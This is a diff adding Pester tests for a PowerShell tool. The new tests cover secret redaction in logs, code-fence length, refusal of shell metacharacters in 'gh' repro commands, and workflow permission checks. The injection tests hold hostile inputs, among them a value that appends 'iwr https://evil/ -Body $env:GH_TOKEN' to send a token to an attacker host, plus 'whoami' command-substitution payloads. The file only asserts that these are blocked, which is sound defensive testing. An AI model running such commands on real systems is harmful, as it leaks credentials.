@@ -140,6 +140,58 @@ Describe 'Format-SanitizedTail - sanitization + tail' {
         $out = Format-SanitizedTail -Output "a`nb`nc" -Lines 50
         ($out -split "`n").Count | Should -Be 3
     }
+
+    It 'redacts JWTs (eyJ... three-segment base64url)' {
+        $jwt = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOjEyMzQ1Njc4OTAsIm5hbWUiOiJK.abcdefghijABCDEFGH'
+        $out = Format-SanitizedTail -Output "token=$jwt end"
+        $out | Should -Match '\[JWT-REDACTED\]'
+        $out | Should -Not -Match 'eyJhbGciOiJIUzI1NiJ9'
+    }
+
+    It 'redacts OpenAI sk- keys' {
+        $key = 'sk-' + ('a' * 48)
+        $out = Format-SanitizedTail -Output "key: $key"
+        $out | Should -Match '\[OPENAI-KEY-REDACTED\]'
+    }
+
+    It 'redacts Slack xoxb- tokens' {
+        $tok = 'xoxb-' + ('1' * 20)
+        $out = Format-SanitizedTail -Output "slack=$tok"
+        $out | Should -Match '\[SLACK-TOKEN-REDACTED\]'
+    }
+
+    It 'redacts AZURE_OPENAI_API_KEY env-var style' {
+        $out = Format-SanitizedTail -Output 'AZURE_OPENAI_API_KEY=abc123secret'
+        $out | Should -Match 'AZURE_OPENAI_API_KEY=\[REDACTED\]'
+        $out | Should -Not -Match 'abc123secret'
+    }
+
+    It 'redacts SAS sv= signature version parameter' {
+        $out = Format-SanitizedTail -Output 'https://x.blob.core.windows.net/c?sv=2022-11-02&sig=abcdefghij12345'
+        $out | Should -Match 'sv=\[REDACTED\]'
+        $out | Should -Match 'sig=\[REDACTED\]'
+    }
+}
+
+Describe 'Get-SafeCodeFence - fence length guard' {
+    It 'returns three backticks when content has no backticks' {
+        Get-SafeCodeFence -Text 'plain text' | Should -Be '```'
+    }
+
+    It 'returns three backticks for null input' {
+        Get-SafeCodeFence -Text $null | Should -Be '```'
+    }
+
+    It 'returns four backticks when content contains a triple-backtick run' {
+        $fence = Get-SafeCodeFence -Text ("here is a fence: " + '```' + " end")
+        $fence.Length | Should -Be 4
+    }
+
+    It 'returns fence longer than the longest backtick run' {
+        $content = '`' * 7
+        $fence = Get-SafeCodeFence -Text $content
+        $fence.Length | Should -BeGreaterThan 7
+    }
 }
 
 Describe 'Invoke-IssueRepro - manual + empty-command guards' {
@@ -160,6 +212,25 @@ Describe 'Invoke-IssueRepro - manual + empty-command guards' {
         $r = Invoke-IssueRepro -Repro @{ Type = 'bogus'; Command = 'x'; Expect = $null }
         $r.Status | Should -Be 'FAIL'
         $r.Output | Should -Match "unknown repro type 'bogus'"
+    }
+
+    It 'refuses a gh command that contains a shell pipeline metacharacter' {
+        $r = Invoke-IssueRepro -Repro @{ Type = 'gh'; Command = 'issue view 1; iwr https://evil/ -Body $env:GH_TOKEN'; Expect = $null }
+        $r.Status   | Should -Be 'FAIL'
+        $r.ExitCode | Should -Be 2
+        $r.Output   | Should -Match 'disallowed character'
+    }
+
+    It 'refuses a gh command that uses command substitution' {
+        $r = Invoke-IssueRepro -Repro @{ Type = 'gh'; Command = 'issue view $(whoami)'; Expect = $null }
+        $r.Status   | Should -Be 'FAIL'
+        $r.Output   | Should -Match 'disallowed character'
+    }
+
+    It 'refuses a gh command that uses a backtick' {
+        $r = Invoke-IssueRepro -Repro @{ Type = 'gh'; Command = 'issue view `whoami`'; Expect = $null }
+        $r.Status   | Should -Be 'FAIL'
+        $r.Output   | Should -Match 'disallowed character'
     }
 }
 
@@ -193,7 +264,19 @@ Describe 'issue-resolution-verify.yml - workflow contract' {
         $perms['contents']      | Should -Be 'read'
         $perms['issues']        | Should -Be 'write'
         $perms['pull-requests'] | Should -Be 'write'
-        $perms['actions']       | Should -Be 'read'
+        $perms.ContainsKey('actions') | Should -BeFalse
+    }
+
+    It 'filters closingIssuesReferences to the same repository (no cross-repo writes)' {
+        $content = Get-Content -Raw $script:WorkflowPath
+        $content | Should -Match 'repository\s*\{\s*nameWithOwner\s*\}'
+        $content | Should -Match 'nameWithOwner\s*==\s*\\"\$REPO\\"'
+    }
+
+    It 'invokes gh mutations through a wrapper that checks $LASTEXITCODE' {
+        $content = Get-Content -Raw $script:WorkflowPath
+        $content | Should -Match 'function Invoke-GhChecked'
+        $content | Should -Match '\$LASTEXITCODE'
     }
 
     It 'gates the verify job on merged == true' {
